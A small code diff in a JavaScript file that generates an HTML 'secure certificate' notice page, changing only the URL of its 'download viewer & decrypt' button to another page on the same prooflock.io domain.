@@ -73,7 +73,7 @@ const htmlContent = `
         <h1>Your Secure Certificate</h1>
         <p>You have received a secure certificate file. To view and decrypt this file, please use the authorized viewer.</p>
         <p>Click the button below to download the viewer and access decryption instructions.</p>
-        <a href="https://prooflock.io/DecryptInstructions.html" class="button">DOWNLOAD VIEWER & DECRYPT</a>
+        <a href="https://prooflock.io/decrypt.html" class="button">DOWNLOAD VIEWER & DECRYPT</a>
         <p style="font-size: 12px; color: #666;">If you have any questions, please contact the sender.</p>
         <div class="footer">
             &copy; 2025 ProofLock Inc. All Rights Reserved.
